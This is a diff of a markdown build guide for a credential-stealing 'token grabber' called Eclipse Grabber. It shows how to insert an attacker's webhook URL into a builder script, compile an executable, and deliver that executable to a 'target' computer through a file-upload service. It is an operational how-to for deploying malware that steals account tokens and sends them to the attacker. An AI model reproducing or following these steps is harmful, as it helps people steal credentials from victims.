@@ -1,9 +1,7 @@
-# Build Guide for {Token grabber}
+# Build Guide for the Eclipse Grabber
 ## Run the builder.py Script
 
-Now that we have a configured, we can run the builder.py script.
-
-To build you will need created earlier the webhook url.
+To build a token Grabber you will need the webhook url from the webhook that we created earlier.
 To access it, head over to your new server's settings and click on the **"Intergrations"** tab. Then click on the **"Webhooks"** tab.
 
 ![image](https://imgur.com/fEIbIfb.png)
@@ -22,6 +20,10 @@ sudo python3 builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
 ```
 sudo python3 builder.py -w YOUR_WEBHOOK_URL -o FILE_NAME
 ```
-![image](https://imgur.com/ntQNtM5.png)
+Make sure you replace the **YOUR_WEBHOOK_URL** with the webhook url you copied earlier and replace **FILE_NAME** with the name you want to give your generated EXE.
 
 Once the builder is done, you will find your generated file in the **dist** directory.
+
+## Execute the generated Eclipse Grabber
+
+Now that you have the Executable file you can share it with the target coputer and run it. You can use a file uploading service like [this](https://file.io) one to **upload/download** the file to the computer.
